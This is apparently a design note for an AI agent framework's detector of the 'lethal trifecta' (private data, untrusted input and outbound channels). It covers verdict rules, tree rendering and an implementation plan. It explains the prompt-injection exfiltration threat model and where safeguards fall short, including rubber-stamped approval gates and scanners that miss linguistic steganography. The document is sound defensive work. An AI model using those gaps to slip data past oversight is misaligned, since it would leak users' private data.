**The map's formatter lives on `Report#render`**, returning a plain
newline-separated String — **zero-arg, no chrome**. No `color:`, no `width:`,
no `indent:`; those knobs are what would turn an acceptable taint (a value
object describing itself) into core knowing a terminal exists. A TUI wanting
Tuile widgets or Rainbow walks the `Report` tree itself — it is `Data` all
the way down — which keeps "dependencies point toward data, never toward UI"
literally true. Named `#render`, **not `to_s`**: `Data` already interpolates
usefully, and a multi-line tree in `to_s` means some future
`logger.info "… #{report}"` silently dumps the whole tree into a one-line log.

**The map is a pure tree dump — no prose, no explanations.** An earlier draft
annotated each leg with sentences ("mail_compose — human commits in
Thunderbird's own UI", "capped by the gate below"). Two things killed it, and
the second is the reason this paragraph exists rather than a style note:
prose in a boot banner is unreadable at a glance, and — the real objection —
**the renderer had no data to build those sentences from.** `Node` carried
only a leg union, so every annotation in that draft was English no data
structure could produce. Structure replaced it: put the **tools in the tree
as leaves** and attribution is something you *read*, not something the
renderer computes. That is what `tool_legs` on the node is for (§(d)).

Four rules (the glyphs are not load-bearing; these are):

1. **One line per entry**, indented by depth. An **agent** node prints its
   **folded** legs; a **tool** leaf prints its **own**. One rule, and
   propagation becomes visible by layout — the parent shows `:egress` while
   no parent tool does, and the sub-agent below it does.
2. **No explanation of any kind.** Not why a leg is there, not what the
   verdict means. The advisory line carries the meaning; the map carries the
   facts.
3. **The delegation gate prints on the sub-agent line** — `[gate:
   human_approver]`. Not an annotation: it is `channel_egress`, a literal
   Node field, and the `min` argument of the series cap. Without it,
   `--no-confirm` changes the parent's verdict while every visible tag stays
   identical, and the map would show an effect with no visible cause — which
   is exactly the regression item 2 clause 1 exists to keep legible.
4. **Empty renders as `[]`**, not blank, so a leg-free tool reads as *checked
   and clear* rather than as an unrendered line. (The "print absent legs too"
   rule stays with the **advisory**, where the missing leg is the actionable
   one; across a dozen tool leaves it is noise.)

```
Trifecta: soft

pikuri-computer [:private, :untrusted_hard, :egress_human_approver]
  fileindex_read [:private, :untrusted_hard]
  bash [:private, :untrusted_hard]
  mail_compose [:private, :egress_human_approver]
  calculator []
  RESEARCHER [gate: human_approver] [:untrusted_hard, :egress]
    web_search [:untrusted_hard, :egress]
    fetch [:untrusted_hard, :egress]

See the book in this repo for what the lethal trifecta is and how to break a leg.
```

Note `web_search` and `fetch` carrying **identical** tags: correct for v1,
where `:egress_searchengine` does not exist and both are hard `:egress`. Read
that line as a live argument for shipping the tag — see below.

The closing line is **static text with no chapter name** — the owning chapter
is deliberately still open (revisit once the detector is built and has
settled), and a placeholder `TODO` shipped in user-facing output survives
three releases. A sentence that needs no chapter number is true now and stays
true after the chapter lands; `book/` is a repo folder, so a reader who has
the repo can find it and one who doesn't would only get a broken link.

#### Order of work

Each step ships standalone and the detector stays silent until the last.

1. `Tool::TrifectaLegs` + `Tool(trifecta_legs:)` + `Trifecta::Node` /
   `walk` / `Report#verdict` / `Report#render` —
   pikuri-core, fully testable from hand-built nodes.
2. `Filesystem(private:, trusted:)` + the `AllowAll` raise; legs on the five
   file tools.
3. `Sandbox#egress?` / `#confined_to_workspace?`; legs on `Bash`.
4. `Confirmer#blocks_on_human?`; the extension hook; `SubAgent` / `Mcp`
   contributions; `Registry` entries' `private:`. Static legs on the
   Thunderbird tools (`private: true` by domain; inbound `:hard`; the two
   outbound hand-offs `:human_approver`).
5. Wire `Trifecta.report_once` into `run_configure` (the advisory) and
   `Agent#trifecta` (the reader); print `#render` from the `bin/` scripts;
   port the dry-run table to a spec — both as verdicts and as expected
   `#render` output.

### 6. v1 buys exactly one bit per lattice — RESOLVED: the verdict is derived, never stored

With `info` out of scope, the two lattices collapse to a single rule:
**loud iff `private` ∧ hard-`untrusted` ∧ autonomous-`egress`; soft iff all
three legs present at any strength; silent otherwise.** The literal "say so"
was discharged when that line landed in the v1 list. What was left is the
design question underneath: if the verdict reads only presence-plus-topness,
what keeps the three-valued representation honest — and what happens when a
third level lands?

**Audit first: the ordering has exactly two consumers.**

- `TrifectaLegs#|` — union in parallel at a node → `max`, needs the ordering.
- `#cap_egress(channel_level)` — the series cap (item 1) → `min`, needs it.
- `#relabel_inbound` — the boundary relabel → a **table**, not an ordering.
- the verdict → presence + topness, needs **nothing**.

So the lattices do earn their keep, and nothing outside `TrifectaLegs` may
consult the ordering. The audit also turns up a rule the note never stated:

**`relabel_inbound` saturates at `:weakened` — it is not "one rung down."**
`:hard → :weakened`, `:weakened → :weakened`, `:none → :none`. The
lattice-decrement reading is the natural generalisation and it is wrong: a
grandchild's untrusted content would launder to `:none` at depth three,
which is exactly the structural claim
[`quarantined-handles.md`](quarantined-handles.md) makes and this note
refuses to make. Two summarizers are no more instruction-resistant than one.
(`min` in series composes across hops for free — associativity — so the
hazard is untrusted-only.)

#### Presence is future-proof; strength is not, and the code must say which

```ruby
# verdict is derived, never stored; see §5(e) for the full field set
Pikuri::Trifecta::Report = Data.define(:label, :legs, :tool_legs, :children, :channel_egress)

def verdict
  return :silent unless legs.private && legs.untrusted != :none && legs.egress != :none
  case [legs.untrusted, legs.egress]
  in [:hard,     :autonomous]     then :loud
  in [:hard,     :human_approver] then :soft
  in [:weakened, :autonomous]     then :soft
  in [:weakened, :human_approver] then :soft
  end
end
```

- **Presence** is `!= :none`, correct for *any* future rung by definition.
- **Strength** is matched exhaustively, so `case/in` raises
  `NoMatchingPatternError` on a fall-through. Adding `:egress_searchengine`
  to the lattice without placing it in the grid then blows up on the first
  wiring that reaches it, instead of being silently absorbed into `soft` (by
  `egress != :autonomous`) or into `loud` (by the same test written the other
  way round). Either absorption destroys the property the revised dry-run
  table just bought — that **loud carries information**. Raise, and don't
  rescue: the only way to reach it is an in-repo edit to a lattice, step 1's
  specs cover the whole grid from hand-built nodes, and a rescue would
  reintroduce precisely the silence this detector exists to refuse.

The max-over-tree needs a third, trivial ordering — a fixed
`%i[silent soft loud]` index lookup. That is the only comparison outside
`TrifectaLegs`, and a fourth verdict (`info`) would go at the bottom of it.

#### Why the verdict is derived, and why it lives on `Report`

**Derived, not stored, because `Data.define` hands you `#with` for free.** A
stored `verdict:` field makes `report.with(legs: other)` return a record whose
severity contradicts its own legs — an inconsistency the type would then
carry around silently. Deriving makes it unrepresentable instead of merely
unlikely. The cost is a pattern match per read, on a frozen record;
what "no re-calculation" is guarding against is a caller re-**walking** the
tree, which this doesn't ask for (`walk` itself calls `#verdict` during the
fold to take the max, so the raise above fires at walk time, not lazily at
render time).

**On `Report`, not on `TrifectaLegs`,** even though the verdict is a pure
function of legs alone and "lowest level that fits" would argue otherwise. A
single *tool's* legs having a verdict is a category error: `Read` over a
private untrusted workspace is `{private, hard, none}`, whose `.verdict`
answers `:silent` — true, meaningless, and inviting. "Is this a trifecta?" is
only a question about a **node**. So `TrifectaLegs` stays purely structural
(two lattices, two boundary ops, no evaluation) and `Report` owns the grid.

#### The verdict collapses; the advice does not

One bit per lattice must not cost the "name the leg to break" requirement,
and it doesn't — because the **renderer reads the cell, not the verdict**.
Three cells map to `soft` and each wants a different fix:

| cell | the leg to break |
|---|---|
| `{hard, approver}` | privilege-separate the untrusted read, or declare the root `trusted:` |
| `{weakened, autonomous}` | sever egress (sandbox net-off) — untrusted is already as attenuated as it gets short of quarantined handles |
| `{weakened, approver}` | both legs already attenuated; narrow `:private` or remove a leg outright |

That is why `Report` carries `legs` (§5(e)), and why a slimmer
`Data.define(:verdict, :path)` would have been a false economy.

#### `:private` stays a boolean — a deliberate divergence from ch7

Two lattices *plus one bool*; union on private is `||`. Worth stating,
because `book/07-os-assistant.md` teaches severity as graded by the **size of
the private pool**, and the docs bullet below already owes that
reconciliation. The answer: pool size is a *human* severity axis; the
detector declines to measure it, for the same reason it declines to grade
scanner strength, attention or frequency. **Presence is binary, strength is
structural, quantity is neither.**

### 7. Author-mode's real blocker is *drafting*, not pre-fill

Sharpens "is strict author-mode even reachable?" above. The note blames
pre-fill UX; the deeper obstacle is that **if the agent displays a proposed
body, a human who retypes it is a pre-fill with extra steps** — the
clean-by-construction proof needs the human to *ignore* the proposal, which
no drafting UX will ever produce (removing the pre-fill just moves the
transcription through the terminal, or the clipboard).

That makes the answer per-seat rather than global, which is more useful
than either horn of the original question:

- **A seat whose job is to draft the payload** (Thunderbird compose)
  **cannot reach `egress_human_author`.** The `info` cell is aspirational
  there, permanently — not for want of the right chrome.
- **A seat where the human's own intent originates the bytes** *can*. A
  researcher prompt that asks "what should I look up?" with a **blank**
  field is genuine author-mode; pikuri-os is one pre-fill removal from it,
  at a real ergonomic cost worth pricing rather than assuming.

If that holds, the "partial author-mode" idea (pre-fill recipient +
subject, blind-typed body) is *not* a rescue for compose — the human still
types a body they were just shown.

#### RESOLVED (2026-08-09): drop `egress_human_author` — it was never a rung

The per-seat split above is right and it is also the end of the level. Take
the second bullet seriously — a seat where the human's own intent originates
the bytes — and ask what the *agent* holds there. Nothing: no proposal of
its own crosses, so no private byte it holds can ride out. The lattice's own
defining bullet conceded this in its first draft ("breaks the egress leg for
exfil — effectively `none` for trifecta purposes"), and **a rung
definitionally equal to the bottom rung is not a rung.** So this is a
dissolution, not a deferral:

> **The egress axis is `none < egress_human_approver < egress`.** A seat
> whose outbound bytes originate in the human's own intent declares
> `egress: :none`, with the reason at the declaration site. Clean-by-
> construction is **leg-absence**, not a weak leg.

Recorded as a *drop* rather than a YAGNI-defer on purpose: "we might want it
later" invites re-proposal the day a blank-field seat ships, and the answer
then is still `:none`, not a third rung.

**Corroboration from the sibling note, reached independently.**
[`private-context-taint.md`](private-context-taint.md) §"The human is the
only clean post-taint egress" puts the human-authored payload *after*
monotonic taint has already severed automatic egress — so in detector terms
the agent's leg is already `:none` and the human's typing is a channel the
agent does not hold. Two notes, two routes, same conclusion.

**What it costs, and what it buys.**

- **Costs:** a wiring that genuinely achieves author-mode gets no *credit* in
  the log — it just doesn't ring. Acceptable: the detector warns, it never
  credits, and there was no `info` verdict in v1 to earn anyway.
- **Verdict-neutral:** the `human_author` row was all `info`, v1 ships no
  `info`, so such a seat scored `silent` before and scores `silent` now. No
  dry-run row moves.
- **Buys, and this is the teaching gain:** the egress axis floor is `:none`,
  so **the only thing better than an approver gate is not holding the leg.**
  Severing beats gating and there is no third option — sharper than a phantom
  rung nobody could reach, and it points every "can we do better than soft?"
  question at leg-removal, which is the only thing that works.
- **Dissolves the inconsistency below** rather than explaining it (see the
  shipped data point).

**Guard: this is not precedent for `:egress_searchengine`.** That deferral is
a different kind. A search-only egress is a *real* rung — bytes genuinely
leave, they are merely unreadable to the attacker — on the orthogonal
attacker-readability axis, and it is unreachable only for want of a
search-only persona, not by definition. `human_author` collapses into
`:none`; `egress_searchengine` does not collapse into anything. Ship it the
day a `SEARCHER` persona does, per its own section.

**Graduation note for whoever builds v1:** when the detector lands in source,
this drop plus the rejected proxy-visible middle rung (item 2) are one
`DECISIONS.md` entry about the shape of the egress axis — the roads not
taken, which is what that file is for. Not yet: nothing has landed in `lib/`,
so the note still owns it.

**And there is already a shipped data point, which cuts the other way and
has to be reckoned with.** `Confirmer::Terminal` does reach forced
authorship — a task that trips a `Sanitizer` warning loses bare approval and
opens an *empty* editor. So the seat is not merely aspirational in a
terminal; it exists, gated on a scanner firing. That is precisely what makes
it unusable *to the detector*: crediting it grades the seat by scanner
strength (see "Scanners must not promote the approver seat"), and the blind
spot is linguistic stego — the case the promotion would be claiming to
cover. The shape of the resolution is probably: the detector reads the
**unconditional** floor of a seat (what the human faces when nothing fires),
while the conditional retype is runtime hardening the docs may credit and
the detector may not. Worth stating explicitly if item 7 is ever closed,
because "we ship forced authorship but classify it as approver" reads as an
inconsistency until the reason is written down.

*That floor rule stands — it is item 2 clause 4, and it is why the scanner-
gated empty editor stays uncredited. But the drop above means it no longer
has to carry the explanation on its own: with `egress_human_author` gone
there is no higher class the shipped forced-retype is being **denied**, so
"we ship forced authorship but classify it as approver" stops reading as an
inconsistency. The terminal's `[e] edit` seat is runtime hardening that the
book and `DESIGN.md` should keep crediting, and the classifier keeps
ignoring — the same split, with nothing left to justify.*

## Open: propagating this to docs + example scripts

Independent of the five open items above (this is about presentation, not
the rule set): how it shows up to a *reader* is unsettled. To
brainstorm next (the *what*, not yet the technical *how*):

- **Reconcile ch7's "binary in presence" with the graded legs.**
  `book/07-os-assistant.md` §"The lesson, both axes in one line" teaches
  that the trifecta is *binary in presence* and *graded in severity by the
  size of the private pool*. That is not wrong, but it is now incomplete:
  the egress leg is tri-state (none / approver-gated / autonomous) and the
  untrusted leg two-state. The fix keeps ch7's actual teaching point — no
  partial credit for 2.5 legs, which is what kills "we're probably fine" —
  and adds that a leg's **presence** is binary while its **strength** is
  not, so severity grades on two independent things: pool size *and* leg
  strength. An approver-gated egress leg is still a leg: assembled, warned,
  not silent. Batch this with whatever else ch7 needs when the detector
  lands, rather than piecemeal.
- Which `bin/pikuri-*` and `book/` examples deliberately *should*
  trip the detector as a teaching moment, and which should be wired to
  stay quiet so the contrast is legible.
- Where the named concepts (`:private` as a user-declared property,
  loud vs soft, "separation raises the bar but doesn't break it") get a
  guide chapter — likely alongside `06-security.md` /
  `09-security-revisited.md`. **Deliberately deferred until the detector is
  built and has settled** (2026-08-09): writing the chapter against a
  design that has moved twice in two days would teach a shape that then
  changes. Both output artifacts are written to need no chapter *name*, so
  this blocks nothing — see §5(f)'s closing line.
- ~~Whether the detector's output is purely a log line or also a
  documented `Agent`-level query a host can render.~~ **Answered
  2026-08-09: both, split by owner.** Core logs a one-line advisory (once
  per process, mandatory); `Agent#trifecta` exposes the `Report` tree and
  hosts render it with `#render` — **every** `bin/` script as an educational
  boot banner, always and with no flag; a future `pikuri-tui` behind
  `/trifecta`. See §5(f).
- How it reads next to the typed-transport-classes idea so the two
  privacy stories (endpoint-private vs agent-holds-the-legs) don't
  confuse.

## v1 scope, in one place

*Revised 2026-08-08: the graded egress axis is in, at two levels. The
earlier flat-`:egress` version of this list is superseded.*

**No holes left — this list is buildable.** All five review items closed
2026-08-08: the series cap, the four gate/level clauses, the MCP defaults,
the file-read `:untrusted` default and the implementation seam, all folded
into the bullets below.

- Tags `:private` (user, default off) / `:untrusted` / `:egress`
  (framework, default on) / `:untrusted_weakened` (computed) /
  `:egress_human_approver` (declared by the tool).
- **Foreign tools (MCP) carry `{untrusted, egress}`** (item 3), plus
  `:private` if **any registered** `Registry` entry declares
  `private: true` — registration is the capability boundary, since
  `mcp_connect` can activate any registered server. The registry is frozen
  at construction, so this is knowable at boot.
- **File reads carry `:untrusted` by default** (item 4). Opt out with
  `trusted: true` on a *scoped* `Filesystem`; rejected on `AllowAll`, where
  it could not be honest. `Bash` takes its untrusted reach from the
  **sandbox's** fs view, not the workspace's.
- `:private` declared on the workspace/corpus; file tools inherit it.
  Exception: domain-inherently-private tools (Thunderbird mail/calendar)
  carry it by default.
- Two lattices, union = max on each:
  `none < untrusted_weakened < untrusted` and
  `none < egress_human_approver < egress`.
- Egress level is `egress_human_approver` iff **all four** clauses hold
  (item 2), else hard `:egress`: (1) a gate that can block on a human —
  not `AUTO_APPROVE`, not a pre-approving `passive_detector`; (2) **payload
  visibility** — the human sees the literal outbound bytes (compose window,
  editable task string), not a proxy (a bash command line); (3) field-set
  closure — every outbound field renders literally; (4) unconditional — the
  floor of the seat, never a scanner-conditional strengthening.
- Boundary relabel, **settled by item 1**: `max` in parallel (legs at one
  node), `min` in series (through a delegation channel). Outbound, the
  parent's propagated egress = `min(channel level, child's level)` **iff the
  child holds no `:private`** — otherwise uncapped. Inbound,
  `untrusted → untrusted_weakened`; `:private` is identity.
- Evaluate every node; verdict = max over tree; report the path.
- Verdict grid, `:private` present:

  | egress ↓ / untrusted → | hard | weakened |
  |---|---|---|
  | autonomous | **loud** | soft |
  | human_approver | **soft** | soft |

  Equivalently, and this is all v1 needs (item 6): **loud** iff `private` ∧
  hard-`untrusted` ∧ autonomous-`egress`; **soft** iff all three legs are
  present at any strength; **silent** otherwise.

- **Dropped from the vocabulary entirely** (item 7, 2026-08-09):
  `egress_human_author` and the `info` cell. Not deferred — a seat whose
  outbound bytes originate in the human's own intent holds no egress leg to
  grade, so it declares `egress: :none`. Clean-by-construction is
  leg-absence. Consequence worth teaching: the only thing better than an
  approver gate is not holding the leg.
- **Not** in v1, but still a real rung:
  `:egress_searchengine` (changes no current verdict — but it is the
  cheapest hardening of the rubber-stamp hole, so it ships the day a
  search-only persona does).
- Warn-only, once per process, message names the leg to break. (Safe as
  stated — item 3 verified that no leg can appear after boot: `mcp_connect`
  activates only already-registered servers and the registry is frozen.)
- **Two artifacts, split by owner** (§5(f)): core logs a one-line **advisory**
  from `run_configure` — `warn` for loud, `info` for soft *and* silent, never
  `error` — where the silent line is descriptive (`2 of 3 legs — …; no egress
  leg found`) and never says "no trifecta detected", a safety claim this
  detector cannot make. Hosts render the **map**: `Agent#trifecta` exposes the
  `Report` tree, `Report#render` formats it as plain multi-line text
  (zero-arg, no chrome — a TUI wanting color walks the tree itself). The
  once-per-process guard belongs to the advisory only, or `/trifecta` would
  work once per session.
- No custom legs, no per-persona knobs, no propagation exceptions, and no
  grading of approver *quality* (scanner strength, attention, frequency).
- Implementation seam (item 5): a `Tool::TrifectaLegs` record computed in
  each tool's **constructor** (which is wiring time — every collaborator is
  a ctor kwarg), defaulting to `ASSUMED` (`untrusted`+`egress` hard,
  `private` still user-declared) so an undeclared tool is presumed hostile
  on every axis the framework could have known; three posture predicates on
  the collaborators
  (`Sandbox#egress?`, `Sandbox#confined_to_workspace?`,
  `Confirmer#blocks_on_human?`), `Filesystem(private:, trusted:)` +
  `Registry` entries' `private:`, one optional `Extension#trifecta_contribution(tools)`
  hook for sub-agent children and the MCP surface, and a pure
  `Trifecta.walk` run at the end of `run_configure` (after the bind sweep),
  main-agent-only and once per process, logging through
  `Pikuri.logger_for('Trifecta')`. The walk returns the root
  `Trifecta::Report(label:, legs:, tool_legs:, children:, channel_egress:)` —
  the **whole tree, down to the individual tools**, since the host-rendered
  map prints them as leaves and that is what makes a propagated leg
  attributable — with `#verdict` **derived**, never a stored field, since
  `Data#with` would let severity contradict legs (item 6), and matching
  `[untrusted, egress]` exhaustively so a third level raises instead of being
  silently absorbed.
